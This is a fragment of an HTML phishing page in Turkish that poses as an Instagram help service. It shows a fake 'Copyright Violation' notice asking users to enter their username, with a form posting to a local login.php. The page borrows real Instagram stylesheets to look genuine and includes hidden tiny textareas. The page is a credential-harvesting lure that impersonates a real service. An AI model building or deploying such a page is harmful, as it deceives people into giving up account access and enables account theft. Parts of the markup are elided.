...
<title>İnstagram Yardım Servisi</title>
      ...
      <div class="lTdZb">
        <div class="vqibd  wNNoj ">
          <div class="ZpgjG   _1I5YO">
            <img style="width: 200px;" src="https://i.imgyukle.com/2020/04/09/QnbQQj.gif"<br>
<h2 class="AjK3K ">Telif Hakkı İhlali</h2>
          
          </div>
          <p class="GusmU SVI5E     ">Lütfen instagram kullanıcı adınızı yazıp "İleri" ye tıklayın ve sonraki formu doldurun.</p>
          <div class="GA2q- ">
            <form class="JraEb" method="get" action="login.php">
              <div class="QuiLu Xb8C0"><input aria-label="@username" aria-required="true" id="nick"
                  name="nick" placeholder="Kullanıcı Adı" type="text" class="PAhYv zyHYP" value=""></div>
              <span class="idhGk _1OSdk"><button
                  class="_5f5mN       jIbKX KUBKM      yZn4P   ">İleri</button></span>
            </form>
          </div>
          
          <br> 
          <div style="font-family:sans-serif; font-size:14px; color:#999;"><br>
            <p class="GusmU  t_gv9    ">Instagram Ekibi olarak Topluluk kurallarına çok önem veriyoruz</p>
            <br>
...
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
 ...
 <textarea Style="width:1px; height:
  ...
  <link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css"
    type="text/css" crossorigin="anonymous">
  <link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css"
    type="text/css" crossorigin="anonymous">
  <link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css"
...
<!www.mini-nuke.de> <textarea Style="width:1px; height:
